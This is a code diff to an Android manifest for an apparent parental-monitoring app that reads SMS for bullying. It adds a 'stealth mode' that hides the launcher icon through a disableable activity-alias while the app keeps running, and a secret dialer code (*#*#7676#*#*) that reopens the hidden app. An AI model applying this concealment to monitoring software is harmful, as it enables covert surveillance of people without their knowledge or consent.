@@ -39,16 +39,28 @@
         android:theme="@style/Theme.ParentalORMental"
         tools:targetApi="34">
 
-        <!-- Main activity -->
+        <!-- Main activity — no launcher filter here so the alias can be toggled for stealth mode -->
         <activity
             android:name=".ui.MainActivity"
             android:exported="true"
-            android:theme="@style/Theme.ParentalORMental">
+            android:theme="@style/Theme.ParentalORMental" />
+
+        <!--
+            Launcher alias — this is what appears in the app drawer.
+            Disabling it (PackageManager.COMPONENT_ENABLED_STATE_DISABLED) hides the icon
+            without touching MainActivity, keeping the app fully functional.
+            Re-entry when hidden: dial *#*#7676#*#* on the device.
+        -->
+        <activity-alias
+            android:name=".ui.MainActivityLauncher"
+            android:targetActivity=".ui.MainActivity"
+            android:enabled="true"
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity-alias>
 
         <!-- SMS Receiver — core bullying monitor -->
         <receiver
@@ -80,6 +92,16 @@
                 android:resource="@xml/device_admin" />
             <intent-filter>
                 <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Stealth re-entry: dial *#*#7676#*#* to reopen hidden app -->
+        <receiver
+            android:name=".monitor.StealthDialerReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+                <data android:scheme="android_secret_code" android:host="7676" />
             </intent-filter>
         </receiver>
 
